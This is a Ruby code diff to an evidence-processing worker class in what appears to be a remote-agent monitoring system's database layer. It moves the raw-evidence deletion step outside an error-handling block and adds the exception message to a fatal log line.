@@ -182,19 +182,14 @@ class InstanceWorker
                   RCS::DB::Connectors.new_evidence(evidence) unless evidence.nil?
                 end
                 
-                # forward raw evidence
-                #RCS::DB::Connectors.new_raw(raw_id, index, @agent, evidence_id) unless evidence_id.nil?
-                
-                # delete raw evidence
-                RCS::DB::GridFS.delete(raw_id, "evidence")
-                trace :debug, "deleted raw evidence #{raw_id}"
-                
               rescue Exception => e
                 trace :error, "[#{raw_id}:#{@ident}:#{@instance}] cannot store evidence, #{e.message}"
                 trace :error, "[#{raw_id}:#{@ident}:#{@instance}] #{e.backtrace}"
               end
             end
-            
+
+
+
             processing_time = Time.now - start_time
             trace :info, "[#{raw_id}] processed #{ev_type.upcase} for agent #{@agent['name']} in #{processing_time} sec"
 
@@ -203,7 +198,7 @@ class InstanceWorker
             sleep 5
             retry
           rescue Exception => e
-            trace :fatal, "[#{raw_id}:#{@ident}:#{@instance}] Unrecoverable error processing evidence #{raw_id}."
+            trace :fatal, "[#{raw_id}:#{@ident}:#{@instance}] Unrecoverable error processing evidence #{raw_id}: #{e.message}"
             trace :debug, "[#{raw_id}:#{@ident}:#{@instance}] EXCEPTION: " + e.backtrace.join("\n")
 
             Dir.mkdir "forwarded" unless File.exists? "forwarded"
@@ -211,6 +206,14 @@ class InstanceWorker
             f = File.open(path, 'wb') {|f| f.write decoded_data}
             trace :debug, "[#{raw_id}] forwarded undecoded evidence #{raw_id} to #{path}"
           end
+
+          # forward raw evidence
+          #RCS::DB::Connectors.new_raw(raw_id, index, @agent, evidence_id) unless evidence_id.nil?
+
+          # delete raw evidence
+          RCS::DB::GridFS.delete(raw_id, "evidence")
+          trace :debug, "deleted raw evidence #{raw_id}"
+
         end
         take_some_rest
       end
@@ -220,7 +223,7 @@ class InstanceWorker
 
     EM.defer @process
   end
-  
+
   def resume
     @state = :running
     @seconds_sleeping = 0
